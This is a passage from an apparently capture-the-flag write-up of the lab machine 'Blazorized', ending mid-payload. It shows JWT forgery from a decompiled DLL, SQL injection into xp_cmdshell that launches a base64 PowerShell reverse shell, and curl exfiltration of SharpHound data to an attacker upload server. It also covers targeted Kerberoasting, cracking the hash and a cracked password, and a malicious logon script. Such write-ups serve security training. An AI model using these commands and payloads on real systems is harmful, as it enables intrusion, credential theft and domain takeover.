\"sha256-krU0mE+qHN23mrVgI0s\\/99oAYEHtztkgJ59u0Uy+x6c=\",\n      \"System.Memory.dll\": \"sha256-+MXdUexgKsH1w9XI5G8BWxuEY0tKIAD+xuE1kO1lYbA=\",\n      \"System.Net.Http.dll\": \"sha256-5YDY3emMx3szDVfae1lDDlTPXH3VB1apmM8hECmSQR4=\",\n      \"System.Net.Http.Json.dll\": \"sha256-CG\\/PL04ZZqfHAYQdh\\/5IJKbcNSUSDUXbz6ZYqyJ5cPM=\",\n      \"System.Net.Primitives.dll\": \"sha256-eNUKNz+XLN5pHDhz0TRrSWVzwD7sT8fHO\\/iPmRMMcmw=\",\n      \"System.ObjectModel.dll\": \"sha256-rCCEEgfTj3ifxigXAW8vpXI2xDFjBeDcFTeEeQRCxGs=\",\n      \"System.Private.CoreLib.dll\": \"sha256-duCS2lpNXrvF\\/sII\\/ROPczy30vEs54dkJG+WagUjwU8=\",\n      \"System.Private.Uri.dll\": \"sha256-QUp9pgVKRli5\\/xLQf5zWfHAD1KRUEi3RgO1D6HY2SHk=\",\n      \"System.Private.Xml.dll\": \"sha256-ApyqBjTVBbNCyZJP0aNRxd1cJdyLNpElRVs622uuJ54=\",\n      \"System.Runtime.CompilerServices.Unsafe.dll\": \"sha256-ioMG7tdGMQuJXQaFEifb58Wo9nhzQ138YPF3FjXFKso=\",\n      \"System.Runtime.dll\": \"sha256-2oCgFx36GBC0xZjd1hl5ZQXxw8zwZ00R\\/SxrGu6Qy\\/4=\",\n      \"System.Runtime.InteropServices.dll\": \"sha256-ZnOr3qdZamAmXJoClwtU11aePkDpbPGGRXGGVZq+qss=\",\n      \"System.Runtime.InteropServices.JavaScript.dll\": \"sha256-K56cee2Wp0fFNOLSZjwAZWsvsexfPJ8Fc\\/rP97RFSG0=\",\n      \"System.Runtime.Intrinsics.dll\": \"sha256-RNcogVfdvH7r++k9\\/Sbs9aGp2Tsky8bIOWUFHl+j4jo=\",\n      \"System.Runtime.Numerics.dll\": \"sha256-+oHtVeVcUysD56UQYTTLJ3BnD9766uThPNHg700sxu0=\",\n      \"System.Security.Claims.dll\": \"sha256-i6iOwZtEGi1jKX5BS7V4Kk8mECmyZ8l49ewkm9Ik64E=\",\n      \"System.Security.Cryptography.Algorithms.dll\": \"sha256-RLpI4SG0X+BmJMzdnl6YDepqNNnezyDys3pyTGWlEkI=\",\n      \"System.Security.Cryptography.Cng.dll\": \"sha256-\\/p2zCahEBOv3gbqd9XHRwVrL\\/fUq8tH43+kjm7i1J\\/I=\",\n      \"System.Security.Cryptography.Csp.dll\": \"sha256-5kZPZt\\/Q7PijslxzV+248xs\\/IheEIclYiOI+4XMCbLM=\",\n      \"System.Security.Cryptography.dll\": \"sha256-A0EGy+fyvbI6PCM1gzdpr\\/jNhfYS5deVqnMdth3sLWA=\",\n      \"System.Security.Cryptography.Encoding.dll\": \"sha256-TLpkd3NtthEaWBqHHShAVwYUIf26TiT4fO86Hig94Js=\",\n      \"System.Security.Cryptography.Primitives.dll\": \"sha256-JILevD8ua6+qLJj8fU9Xymuzm2vr701AQnCKSlCKLjE=\",\n      \"System.Security.Cryptography.X509Certificates.dll\": \"sha256-Tt6t3gSGKhS6w1kcDylF6h1UA+FrRey75wv1Dr88Ctc=\",\n      \"System.Text.Encodings.Web.dll\": \"sha256-lwzvCAdo+KGRqRiuotyXVHSbpe7fuNSGMM0OMK0VbPk=\",\n      \"System.Text.Json.dll\": \"sha256-ZgCOtGviIgH5dm9k+o2H8tL+gga3BjBCdmpl16zI2Xs=\",\n      \"System.Text.RegularExpressions.dll\": \"sha256-A0Xkv8sUH8DOBuAI5Jwc9XCl\\/F4IeSM57\\/tzPba6HEU=\",\n      \"System.Threading.dll\": \"sha256-J1ieNAafmr6H5LOMxJMuRKh3LGKtmT2upEU\\/c5tnt68=\",\n      \"System.Threading.Thread.dll\": \"sha256-pLV9qpTnD4J45AaN\\/Z3QTnTPFGQwMI4mFEJaij83X3Q=\",\n      \"System.Xml.ReaderWriter.dll\": \"sha256-9yumv+5QaTSARQB46DStO9vcXQyA3cPvv74jAta3lQA=\"\n    },\n    \"extensions\": null,\n    \"lazyAssembly\": {\n      \"Blazorized.Helpers.dll\": \"sha256-ekLzpGbbVEn95uwSU2BGWpjosCK\\/fqqQRjGFUW0jAQQ=\"\n    },\n    \"libraryInitializers\": null,\n    \"pdb\": null,\n    \"runtime\": {\n      \"dotnet.7.0.15.x46e81vra7.js\": \"sha256-MHuxwxeVFybuBBTAWeZrvoStZpW+H4ThSaRcFvrfqXM=\",\n      \"dotnet.timezones.blat\": \"sha256-aHk3Pm2JXopn6UPLJtovAqIdIk8GyIMzGm450cli9UE=\",\n      \"dotnet.wasm\": \"sha256-fMuaMGy\\/7q8rXL+GyH9Gu04mJDwQ\\/OSYXD9ezf+Fz4k=\",\n      \"icudt_CJK.dat\": \"sha256-SZLtQnRc0JkwqHab0VUVP7T3uBPSeYzxzDnpxPpUnHk=\",\n      \"icudt_EFIGS.dat\": \"sha256-8fItetYY8kQ0ww6oxwTLiT3oXlBwHKumbeP2pRF4yTc=\",\n      \"icudt_no_CJK.dat\": \"sha256-L7sV7NEYP37\\/Qr2FPCePo5cJqRgTXRwGHuwF5Q+0Nfs=\",\n      \"icudt.dat\": \"sha256-tO5O5YzMTVSaKBboxAqezOQL9ewmupzV2JrB5Rkc8a4=\"\n    },\n    \"runtimeAssets\": {\n      \"dotnet.wasm\": {\n        \"behavior\": \"dotnetwasm\",\n        \"hash\": \"sha256-fMuaMGy\\/7q8rXL+GyH9Gu04mJDwQ\\/OSYXD9ezf+Fz4k=\"\n      }\n    },\n    \"satelliteResources\": null\n  }\n}\n</code></pre> <p>We download the discovered files, most importantly the <code>Blazorized.Helpers.dll</code> file using <code>curl</code>.</p> <pre><code>$ curl -s 'http://blazorized.htb/_framework/Blazorized.Helpers.dll' -o Blazorized.Helpers.dll\n</code></pre>"}, {"location": "Write-Ups/Blazorized/#exploitation", "title": "Exploitation", "text": ""}, {"location": "Write-Ups/Blazorized/#decompiling-dlls", "title": "Decompiling DLLs", "text": "<p>Spin up a Windows host to use <code>dnSpy</code> to decompile the DLL files. Once decompiled we will find very interesting information saved at the <code>JWT</code> class for the <code>Blazorized.Helpers.dll</code> file. It has the JWT security key hard-coded as a variable as well as the claims as the class' member variables.</p> <p></p> <p>Furthermore we discover the algorithm used for the JWT through the <code>VerifyJWT</code> function.</p> <p></p> <p>We can also find out what exact values we need in order to craft a Super Admin JWT by looking at the <code>GenerateSuperAdminJWT</code> function.</p> <p></p>"}, {"location": "Write-Ups/Blazorized/#generate-jwt", "title": "Generate JWT", "text": "<p>We now have all the information needed to generate a Super Admin JWT. We know the values for the <code>iss</code> and <code>aud</code> registered claims as well as the custom claims values for <code>role</code> and <code>emailaddress</code>. In addition we have the security key and the encryption algorithm. The last thing needed is to convert the expiration date of the JWT to <code>epoch</code> format.</p> <p>To generate the JWT with this information, we use the jwt.io.</p> <p></p> <p>We add all the information, the to-epoch converted expiration date of the JWT and the secret key under <code>VERIFY SIGNATURE</code>. Next copy the encoded token and add it to our local storage in our browser for the <code>http://admin.blazorized.htb</code> website.</p> <p></p> <p>Upon refreshing the page we successfully get authenticated to the Super Admin Panel.</p>"}, {"location": "Write-Ups/Blazorized/#sql-injection", "title": "SQL Injection", "text": "<p>We enumerate the newly unlocked functionalities and eventually find an SQL Injection vulnerability for the <code>Check Duplicate Category Names</code> functionality.</p> <p>If we enter some expected category name, we get the expected response:</p> <p></p> <p>However using the following payload (<code>sqli' 1=1-- -</code>), we can confirm SQL injection as being possible, since it retrieved all the category names.</p> <p></p> <p>Since we know this is an MSSQL database, we continue by trying to execute commands using the <code>xp_cmdshell</code> in hopes that we are a privileged user to do so. We find out it is already enabled so we continue with preparing a payload in order to obtain a reverse shell connection.</p> <p>We craft a <code>base64</code> encoded PowerShell command using revshells and start our listener on our attack host. Next we issue the payload <code>sqli'; EXEC xp_cmdshell 'powershell.exe -e &lt;BASE64&gt;'-- -</code>.</p> <p></p> <p>And we successfully get a reverse shell connection established on the <code>DC1</code> host as domain user <code>nu_1055</code>.</p> <pre><code>$ rlwrap -cAr nc -lvnp 6666\nlistening on [any] 6666 ...\nconnect to [10.10.16.33] from (UNKNOWN) [10.129.231.74] 60584\n\nPS C:\\Windows\\system32&gt; whoami\nblazorized\\nu_1055\nPS C:\\Windows\\system32&gt; hostname\nDC1\n</code></pre> <p>The user flag can now be found at <code>C:\\Users\\NU_1055\\Desktop\\user.txt</code></p> <pre><code>PS C:\\&gt; type C:\\Users\\NU_1055\\Desktop\\user.txt\nd85aff2be64c6b9e0252787ba15d6fcb\n</code></pre>"}, {"location": "Write-Ups/Blazorized/#ad-exploitation", "title": "AD Exploitation", "text": "<p>We start a web server on our attack host to transfer over the <code>SharpHound</code> tool in order to gather information about the Active Directory domain.</p> <pre><code>$ python3 -m http.server 1080\n</code></pre> <p>And we download it to the victim host using <code>curl</code>.</p> <pre><code>PS C:\\Programdata\\xpltive&gt; curl http://10.10.16.33:1080/SharpHound.exe -o SharpHound.exe\n</code></pre> <p>Next we run it to collect all the information and save it as a ZIP file.</p> <pre><code>PS C:\\Programdata\\xpltive&gt; .\\SharpHound.exe -c All --zipfilename blazorized\n2025-01-17T17:35:48.0030205-06:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release of BloodHound\n2025-01-17T17:35:48.1749202-06:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote\n2025-01-17T17:35:48.2061451-06:00|INFORMATION|Initializing SharpHound at 5:35 PM on 1/17/2025\n2025-01-17T17:35:48.3155085-06:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for blazorized.htb : DC1.blazorized.htb\n2025-01-17T17:35:48.4405138-06:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote\n2025-01-17T17:35:48.5967695-06:00|INFORMATION|Beginning LDAP search for blazorized.htb\n2025-01-17T17:35:48.6436574-06:00|INFORMATION|Producer has finished, closing LDAP channel\n2025-01-17T17:35:48.6436574-06:00|INFORMATION|LDAP channel closed, waiting for consumers\n2025-01-17T17:36:18.7530508-06:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 35 MB RAM\n2025-01-17T17:36:34.6748818-06:00|INFORMATION|Consumers finished, closing output channel\n2025-01-17T17:36:34.7061341-06:00|INFORMATION|Output channel closed, waiting for output task to complete\nClosing writers\n2025-01-17T17:36:34.8936755-06:00|INFORMATION|Status: 110 objects finished (+110 2.391304)/s -- Using 43 MB RAM\n2025-01-17T17:36:34.8936755-06:00|INFORMATION|Enumeration finished in 00:00:46.3006387\n2025-01-17T17:36:34.9717551-06:00|INFORMATION|Saving cache with stats: 70 ID to type mappings.\n 70 name to SID mappings.\n 0 machine sid mappings.\n 2 sid to domain mappings.\n 0 global catalog mappings.\n2025-01-17T17:36:34.9873843-06:00|INFORMATION|SharpHound Enumeration Completed at 5:36 PM on 1/17/2025! Happy Graphing!\n</code></pre> <p>And we start an upload server on our attack host in order to transfer the ZIP from the victim to us.</p> <pre><code>$ python3 -m uploadserver 1081\n</code></pre> <p>Finally we transfer the ZIP file containing the domain information over using <code>curl</code>.</p> <pre><code>PS C:\\Programdata\\xpltive&gt; cmd /c curl -X POST -F \"files=@20250117173634_blazorized.zip\" http://10.10.16.33:1081/upload\n</code></pre> <p>Importing the ZIP archive into our <code>BloodHound</code> application, we see that we have <code>WriteSPN</code> rights on user <code>rsa_4810</code>.</p> <p></p>"}, {"location": "Write-Ups/Blazorized/#targeted-kerberoasting-lateral-movement-to-rsa_4810", "title": "Targeted Kerberoasting &amp; Lateral Movement to rsa_4810", "text": "<p>We can abuse this configuration by performing a targeted Kerberoasting attack. To do so we first have to transfer over <code>PowerView</code> to the victim host. After doing so we use the <code>Set-DomainObject</code> functionality of it to set a \"bogus\" service principal name to the <code>rsa_4810</code> user. This in turn allows us to request the Kerberos TGS ticket of the user (using <code>Get-DomainSPNTicket</code> function) and finally attempt to crack it to obtain clear-text credentials.</p> <pre><code>PS C:\\Programdata\\xpltive&gt; Set-DomainObject -Identity RSA_4810 -SET @{serviceprincipalname='doesnt/MATTER'}\nPS C:\\Programdata\\xpltive&gt; Get-DomainUser -Identity rsa_4810 -SPN | Get-DomainSPNTicket -OutputFormat Hashcat | Select-Object -ExpandProperty Hash                                                                                                                                       \n$krb5tgs$23$*RSA_4810$blazorized.htb$doesnt/MATTER*$B443879BFD6B5AE278B97BCC90779BE9$D9434675A5263EE085C9F815E963EECD15C25478ADACA311549185B767A17450BC07EFCF764D52AE2CE1AE8BC5612F4140A4CB0C15760F59709EEE9550545644C95215D4CAD77DEBB84FB032AED0D863DE47842546A72B077D14928F1DF224788D372BD5FAF1633D981ECC2F12439CF1F290323AF244AF70230825B0EA26D13154A6A37360706089343E2C644515E08EA204D3EF7935FB26DA513AD5672084127A0093B2CB238C8C227ADFF53FB18255E745A32790706F1780EEA99B19F2C072C4802FFB8F00867B32E3EB0656D81B5D0A9432531E6599C0C05E0154B5DF565EEB8E48774C5FA64856E104CD87F4059FD8452C7E7306413612FF0E339EBAE665B33346919806C9E10AAAA10D128B475A063BD1259710F1C5DFA308B2CE97EA3F3358688015CDAF54AC2F8555D3A4AEE0761B4FB8A184681C6204034C0F0117E035B1866EBF76AEFF1FEAAC16107DE6A0EFF6255953C9F2516A427878B55D75A0FF1AB6E0CC2E878198531008E9FB7781FFAA50A8030DAEC1470B5B348CF7760E06184F2EA36C6B29FB1CAC4B88E7AADE2C813C462062698F82AD5C36855E1738A739BCB52A16EFD0119228F4F7B370089AEC9476E1E556E4EC021D0164905F1D7D2945FC1CC939AB77EF59431FA17498BBBD956B3E8111CCFB71146D5A4A2FAB53A43F5D44A7E8279E786B0819EF69CD3B00574D6908BF3AD565B24876242D6BA95B04CBB326F38BE2108B049136AF294E5ECA0C1F0254E397FE8C7DC579F607C9720AA4B4FEF8AE8EA6B2DFCDC1542C958568B9B47DAE8B4BAFB6E742B6D8174DFEE1D653B3D0E496E0DC0A8B7961B72A73993F3B82FAB9B59DD6FC7D527A1ECF38146DC646B32A48DACCA8844F6E6A9CECC06FEF3EDA464FBBDF00BDB27C6D29718535D77BA6F9C0D45410634878CF86A88C2BF8CF8C7D2AD007A2152826C656E822384D00D93176FF4A23742483E2E3D1E097C76FEE190431F83239440A87ECC3526698D136DC1D58221D387DB4432F122D5633706D0357D3F0D0F97DBB43B505B6775164502AFFD20B0DB63B7B68E9AC35A831F62A2420A63288940267E29A072A2E253F8E0FA3DD9EC4F8ABFA7B6D0BCF9F9D8450FF6F0F249D5940067B53BD1CFC677A576E1632BCA45F0CF158321FBC82EECC75A1A192CCF6A488A2C6AB7F70CF8C5A6CAEA093889CC490934353DF20D1EE40A8BF90B16A28802FCEE23774B9FFE81B29AF5E443F5656A68589B717F3B0523C82E7918097C9BE1832BB9CD60521374A2C2C276B8393A3990F605EFF98D5113C7CE8928FF25B562623CB9A1255DDF8E0E5F3D0DF44D180CBC9F88952FD64BFDA2E4B2B2D00EB46337069D6320D77900391D98D107CC5D2E85468B5824D51E15C8633F70CB3FB870A36A53AE195D428F5D8E5B032995E9D5CAE7CF21DA3338F8787706F00C7B849C7E2A7EA9DC31B7363F8BBE3F71CF02114BEDB7DF24E382795A36D6666B16B18A6CD716178E8AF317DA4F8120ACDF4BD3D11EBA8941964F3268B31B3E978E3E735ACBC27427B704FFC6E7D6A980B05B94E205A860140DA39303D72D91C41A2360888F36DAD34763394CA1B5D836CE0E11CAD88BA0FDD46DBD86BA078FEAA7EF568F0F07FAA6337125AFAF404AA0B1543029F2FB65DE5CDF95CC1C7FDB2AC7D8653DB9AABB20CCF8B2EF370E21CD7E0E96CEFE4057A431332BF35D61CBFB55279C094266F7BCF6633FDC4B29E039F8374A731BD3C99A2FB597CDA3C2D1C5B5CF17B15727AB2EB6D5D428E83\n</code></pre> <p>We copy the TGS ticket obtained and crack it using <code>Hashcat</code>.</p> <pre><code>$ ./hashcat --identify hashes/blazorized/rsa_4810.tgs\n&lt;--SNIP--&gt;\n$krb5tgs$23$*RSA_4810$blazorized.htb$doesnt/MATTER*$b443879bfd6b5ae278b97bcc90779be9$d9434675a5263ee085c9f815e963eecd15c25478adaca311549185b767a17450bc07efcf764d52ae2ce1ae8bc5612f4140a4cb0c15760f59709eee9550545644c95215d4cad77debb84fb032aed0d863de47842546a72b077d14928f1df224788d372bd5faf1633d981ecc2f12439cf1f290323af244af70230825b0ea26d13154a6a37360706089343e2c644515e08ea204d3ef7935fb26da513ad5672084127a0093b2cb238c8c227adff53fb18255e745a32790706f1780eea99b19f2c072c4802ffb8f00867b32e3eb0656d81b5d0a9432531e6599c0c05e0154b5df565eeb8e48774c5fa64856e104cd87f4059fd8452c7e7306413612ff0e339ebae665b33346919806c9e10aaaa10d128b475a063bd1259710f1c5dfa308b2ce97ea3f3358688015cdaf54ac2f8555d3a4aee0761b4fb8a184681c6204034c0f0117e035b1866ebf76aeff1feaac16107de6a0eff6255953c9f2516a427878b55d75a0ff1ab6e0cc2e878198531008e9fb7781ffaa50a8030daec1470b5b348cf7760e06184f2ea36c6b29fb1cac4b88e7aade2c813c462062698f82ad5c36855e1738a739bcb52a16efd0119228f4f7b370089aec9476e1e556e4ec021d0164905f1d7d2945fc1cc939ab77ef59431fa17498bbbd956b3e8111ccfb71146d5a4a2fab53a43f5d44a7e8279e786b0819ef69cd3b00574d6908bf3ad565b24876242d6ba95b04cbb326f38be2108b049136af294e5eca0c1f0254e397fe8c7dc579f607c9720aa4b4fef8ae8ea6b2dfcdc1542c958568b9b47dae8b4bafb6e742b6d8174dfee1d653b3d0e496e0dc0a8b7961b72a73993f3b82fab9b59dd6fc7d527a1ecf38146dc646b32a48dacca8844f6e6a9cecc06fef3eda464fbbdf00bdb27c6d29718535d77ba6f9c0d45410634878cf86a88c2bf8cf8c7d2ad007a2152826c656e822384d00d93176ff4a23742483e2e3d1e097c76fee190431f83239440a87ecc3526698d136dc1d58221d387db4432f122d5633706d0357d3f0d0f97dbb43b505b6775164502affd20b0db63b7b68e9ac35a831f62a2420a63288940267e29a072a2e253f8e0fa3dd9ec4f8abfa7b6d0bcf9f9d8450ff6f0f249d5940067b53bd1cfc677a576e1632bca45f0cf158321fbc82eecc75a1a192ccf6a488a2c6ab7f70cf8c5a6caea093889cc490934353df20d1ee40a8bf90b16a28802fcee23774b9ffe81b29af5e443f5656a68589b717f3b0523c82e7918097c9be1832bb9cd60521374a2c2c276b8393a3990f605eff98d5113c7ce8928ff25b562623cb9a1255ddf8e0e5f3d0df44d180cbc9f88952fd64bfda2e4b2b2d00eb46337069d6320d77900391d98d107cc5d2e85468b5824d51e15c8633f70cb3fb870a36a53ae195d428f5d8e5b032995e9d5cae7cf21da3338f8787706f00c7b849c7e2a7ea9dc31b7363f8bbe3f71cf02114bedb7df24e382795a36d6666b16b18a6cd716178e8af317da4f8120acdf4bd3d11eba8941964f3268b31b3e978e3e735acbc27427b704ffc6e7d6a980b05b94e205a860140da39303d72d91c41a2360888f36dad34763394ca1b5d836ce0e11cad88ba0fdd46dbd86ba078feaa7ef568f0f07faa6337125afaf404aa0b1543029f2fb65de5cdf95cc1c7fdb2ac7d8653db9aabb20ccf8b2ef370e21cd7e0e96cefe4057a431332bf35d61cbfb55279c094266f7bcf6633fdc4b29e039f8374a731bd3c99a2fb597cda3c2d1c5b5cf17b15727ab2eb6d5d428e83:(Ni7856Do9854Ki05Ng0005 #)\n&lt;--SNIP--&gt;\n</code></pre> <p>It successfully cracks with the password <code>(Ni7856Do9854Ki05Ng0005 #)</code>. The compromised user <code>rsa_4810</code> is also part of the <code>REMOTE MANAGEMENT USERS</code> group and thus we can authenticate via <code>WinRM</code> to the <code>DC1</code> host (discovered during <code>Nmap</code> scan).</p> <p></p> <p>We will use <code>Evil-WinRM</code> to establish the connection.</p> <pre><code>$ evil-winrm -i dc1.blazorized.htb -u rsa_4810 -p '(Ni7856Do9854Ki05Ng0005 #)'\n\nEvil-WinRM shell v3.7\n\nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine\n\nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n\nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\RSA_4810\\Documents&gt; whoami\nblazorized\\rsa_4810\n*Evil-WinRM* PS C:\\Users\\RSA_4810\\Documents&gt; hostname\nDC1\n</code></pre>"}, {"location": "Write-Ups/Blazorized/#writing-logon-script-lateral-movement-to-ssa_6010", "title": "Writing Logon Script &amp; Lateral Movement to ssa_6010", "text": "<p>Having code execution as domain user <code>rsa_4810</code>, we go back to our <code>BloodHound</code> data and also discover the compromised user as being in a non-standard group called <code>REMOTE_SUPPORT_ADMINISTRATORS</code>.</p> <p></p> <p>We don't get far by using just the imported <code>BloodHound</code> data, however this hints at some other configuration within the Active Directory environment we might be able to abuse.</p> <p>We continue with using <code>PowerView</code> with the compromised user to get an insight about all the ACL's they have access to.</p> <pre><code>*Evil-WinRM* PS C:\\ProgramData\\xpltive&gt; Import-Module .\\PowerView.ps1\n*Evil-WinRM* PS C:\\ProgramData\\xpltive&gt; $rsa_4810_sid = Convert-NameToSid rsa_4810\n*Evil-WinRM* PS C:\\ProgramData\\xpltive&gt; Get-DomainObjectAcl -Identity * -ResolveGUIDs | ? {$_.SecurityIdentifier -eq $rsa_4810_sid}\n\n\nAceType               : AccessAllowed\nObjectDN              : CN=NU_1055,CN=Users,DC=blazorized,DC=htb\nActiveDirectoryRights : ReadProperty, GenericExecute\nOpaqueLength          : 0\nObjectSID             : S-1-5-21-2039403211-964143010-2924010611-1117\nInheritanceFlags      : None\nBinaryLength          : 36\nIsInherited           : False\nIsCallback            : False\nPropagationFlags      : None\nSecurityIdentifier    : S-1-5-21-2039403211-964143010-2924010611-1107\nAccessMask            : 131092\nAuditFlags            : None\nAceFlags              : None\nAceQualifier          : AccessAllowed\n\nAceQualifier           : AccessAllowed\nObjectDN               : CN=SSA_6010,CN=Users,DC=blazorized,DC=htb\nActiveDirectoryRights  : WriteProperty\nObjectAceType          : Script-Path\nObjectSID              : S-1-5-21-2039403211-964143010-2924010611-1124\nInheritanceFlags       : None\nBinaryLength           : 56\nAceType                : AccessAllowedObject\nObjectAceFlags         : ObjectAceTypePresent\nIsCallback             : False\nPropagationFlags       : None\nSecurityIdentifier     : S-1-5-21-2039403211-964143010-2924010611-1107\nAccessMask             : 32\nAuditFlags             : None\nIsInherited            : False\nAceFlags               : None\nInheritedObjectAceType : All\nOpaqueLength           : 0\n\nAceType               : AccessAllowed\nObjectDN              : CN=SSA_6010,CN=Users,DC=blazorized,DC=htb\nActiveDirectoryRights : ReadProperty, GenericExecute\nOpaqueLength          : 0\nObjectSID             : S-1-5-21-2039403211-964143010-2924010611-1124\nInheritanceFlags      : None\nBinaryLength          : 36\nIsInherited           : False\nIsCallback            : False\nPropagationFlags      : None\nSecurityIdentifier    : S-1-5-21-2039403211-964143010-2924010611-1107\nAccessMask            : 131092\nAuditFlags            : None\nAceFlags              : None\nAceQualifier          : AccessAllowed\n</code></pre> <p>We have the <code>WriteProperty</code> rights on the <code>Script-Path</code> of domain user <code>SSA_6010</code>. With this we can write a custom script that executes upon logon of the <code>SSA_6010</code> user.</p> <p>The logon scripts are usually stored at <code>\\\\DOMAIN\\SYSVOL\\DOMAIN\\scripts\\...</code>. We need to be able to write to the folder as the <code>rsa_4810</code> domain user or any other user we have compromised. To check the access rights to it we can run a quick check with <code>icalcs</code>.</p> <pre><code>*Evil-WinRM* PS C:\\ProgramData\\xpltive&gt; icacls \\\\blazorized.htb\\sysvol\\blazorized.htb\\scripts\\\n\\\\blazorized.htb\\sysvol\\blazorized.htb\\scripts\\ CREATOR OWNER:(OI)(CI)(IO)(F)\n                                                NT AUTHORITY\\Authenticated Users:(OI)(CI)(RX)\n                                                NT AUTHORITY\\SYSTEM:(OI)(CI)(F)\n                                                BLAZORIZED\\RSA_4810:(RX)\n                                                BLAZORIZED\\Administrator:(RX)\n                                                BUILTIN\\Administrators:(RX,W,WDAC,WO)\n                                                BUILTIN\\Administrators:(OI)(CI)(IO)(F)\n                                                BUILTIN\\Server Operators:(OI)(CI)(RX)\n\nSuccessfully processed 1 files; Failed processing 0 files\n*Evil-WinRM* PS C:\\ProgramData\\xpltive&gt; icacls \\\\blazorized.htb\\sysvol\\blazorized.htb\\scripts\\*\n\\\\blazorized.htb\\sysvol\\blazorized.htb\\scripts\\11DBDAEB100D BUILTIN\\Administrators:(I)(F)\n                                                            CREATOR OWNER:(I)(OI)(CI)(IO)(F)\n                                                            NT AUTHORITY\\Authenticated Users:(I)(OI)(CI)(RX)\n                                                            NT AUTHORITY\\SYSTEM:(I)(OI)(CI)(F)\n                                                            BUILTIN\\Administrators:(I)(OI)(CI)(IO)(F)\n                                                            BUILTIN\\Server Operators:(I)(OI)(CI)(RX)\n\n\\\\blazorized.htb\\sysvol\\blazorized.htb\\scripts\\A2BFDCF13BB2 BUILTIN\\Administrators:(I)(F)\n                                                            CREATOR OWNER:(I)(OI)(CI)(IO)(F)\n                                                            NT AUTHORITY\\Authenticated Users:(I)(OI)(CI)(RX)\n                                                            NT AUTHORITY\\SYSTEM:(I)(OI)(CI)(F)\n                                                            BUILTIN\\Administrators:(I)(OI)(CI)(IO)(F)\n                                                            BUILTIN\\Server Operators:(I)(OI)(CI)(RX)\n\n\\\\blazorized.htb\\sysvol\\blazorized.htb\\scripts\\A32FF3AEAA23 BLAZORIZED\\RSA_4810:(OI)(CI)(F)\n                                                            BLAZORIZED\\Administrator:(OI)(CI)(F)\n                                                            BUILTIN\\Administrators:(I)(F)\n                                                            CREATOR OWNER:(I)(OI)(CI)(IO)(F)\n                                                            NT AUTHORITY\\Authenticated Users:(I)(OI)(CI)(RX)\n                                                            NT AUTHORITY\\SYSTEM:(I)(OI)(CI)(F)\n                                                            BUILTIN\\Administrators:(I)(OI)(CI)(IO)(F)\n                                                            BUILTIN\\Server Operators:(I)(OI)(CI)(RX)\n\n\\\\blazorized.htb\\sysvol\\blazorized.htb\\scripts\\CADFDDCE0BAD BUILTIN\\Administrators:(I)(F)\n                                                            CREATOR OWNER:(I)(OI)(CI)(IO)(F)\n                                                            NT AUTHORITY\\Authenticated Users:(I)(OI)(CI)(RX)\n                                                            NT AUTHORITY\\SYSTEM:(I)(OI)(CI)(F)\n                                                            BUILTIN\\Administrators:(I)(OI)(CI)(IO)(F)\n                                                            BUILTIN\\Server Operators:(I)(OI)(CI)(RX)\n\n\\\\blazorized.htb\\sysvol\\blazorized.htb\\scripts\\CAFE30DAABCB BUILTIN\\Administrators:(I)(F)\n                                                            CREATOR OWNER:(I)(OI)(CI)(IO)(F)\n                                                            NT AUTHORITY\\Authenticated Users:(I)(OI)(CI)(RX)\n                                                            NT AUTHORITY\\SYSTEM:(I)(OI)(CI)(F)\n                                                            BUILTIN\\Administrators:(I)(OI)(CI)(IO)(F)\n                                                            BUILTIN\\Server Operators:(I)(OI)(CI)(RX)\n\nSuccessfully processed 5 files; Failed processing 0 files\n</code></pre> <p>We have full access to the <code>A32FF3AEAA23</code> folder. With this information we will plan the attack to create a malicious <code>.bat</code> file executing a PowerShell command serving to establish a reverse shell connection and put it into this directory. Finally we will modify the script path for the <code>ssa_6010</code> user in order for them to run the malicious <code>.bat</code> file upon logging in and establishing a connection to our attack host.</p> <p>Starting with creating the malicious <code>.bat</code>. We will once again use <code>base64</code> encoded PowerShell command of revshells and just save it as a <code>.bat</code> file.</p> <pre><code>$ echo 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMwAzACIALAA2ADYANgA2ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwB